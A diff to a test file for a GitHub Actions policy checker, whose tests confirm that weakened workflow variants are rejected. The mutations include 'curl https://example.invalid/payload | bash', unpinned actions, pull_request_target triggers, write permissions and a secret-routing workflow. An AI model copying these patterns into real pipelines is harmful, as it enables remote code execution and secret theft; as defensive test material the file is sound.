@@ -96,12 +96,26 @@ describe('R4 E3 trusted proof policy', () => {
     ['  workflow_dispatch:\n', '  pull_request_target:\n'],
     ['permissions: {}', 'permissions:\n  contents: write'],
     ['environment: r4-trusted-proof', 'environment: other-environment'],
-    ['persist-credentials: false', 'persist-credentials: true'],
-    ['actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803', 'actions/checkout@main'],
+    ["GIT_TERMINAL_PROMPT: '0'", "GIT_TERMINAL_PROMPT: '1'"],
+    ['fetch --depth=1 --no-tags', 'fetch --depth=2 --no-tags'],
+    ['CONTROL_ROOT_SHA: ${{ github.workflow_sha }}', 'CONTROL_ROOT_SHA: ${{ github.sha }}'],
+    [
+      'https://github.com/SolusQuest/agentic-pr-review.git',
+      'https://github.com/other/repository.git',
+    ],
+    ['id: acquire-exact-sources', 'uses: actions/checkout@main'],
     ['${{ vars.R4_TRUSTED_PROOF_AUTHORIZATION }}', '${{ inputs.R4_TRUSTED_PROOF_AUTHORIZATION }}'],
     [
-      'bash payload-source/runtime/scripts/prepare-r4-trusted-proof-payload-v2.sh',
+      'bash control-root/runtime/scripts/prepare-r4-trusted-proof-payload-current.sh',
       'curl https://example.invalid/payload | bash',
+    ],
+    [
+      'uses: ./control-root/.github/actions/agentic-pr-review',
+      'uses: SolusQuest/agentic-pr-review/.github/actions/agentic-pr-review@5b5769753653bb3fd3e68cf8b7bb88a1bd350613',
+    ],
+    [
+      '--expected-payload-sha256 "${{ needs.authorization-preflight.outputs.expected-payload-sha256 }}"',
+      '--receipt "$GITHUB_WORKSPACE/control-root/runtime/tests/fixtures/action-host/trusted-proof/trusted-proof-payload-receipt-v2.json"',
     ],
     [
       '      - id: prepare\n',
@@ -138,11 +152,11 @@ describe('R4 E3 trusted proof policy', () => {
     expect(() => checkR4TrustedProof({ fixtureRoot: candidate })).toThrow(/fixture-digest/u);
   });
 
-  test('rejects a second provider-secret workflow route', () => {
+  test('rejects a second trusted-proof provider-canary workflow route', () => {
     const workflowsRoot = copiedWorkflowsRoot();
     fs.writeFileSync(
       path.join(workflowsRoot, 'unexpected.yml'),
-      `name: unexpected\non:\n  workflow_dispatch:\npermissions: {}\njobs:\n  route:\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          KEY: \${{ secrets.DEEPSEEK_API_KEY }}\n        run: echo blocked\n`,
+      `name: unexpected\non:\n  workflow_dispatch:\npermissions: {}\njobs:\n  route:\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          KEY: \${{ secrets.AGENTIC_PR_REVIEW_TRUSTED_PROOF_PROVIDER_CANARY }}\n        run: echo blocked\n`,
     );
     expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-secret-routes/u);
   });
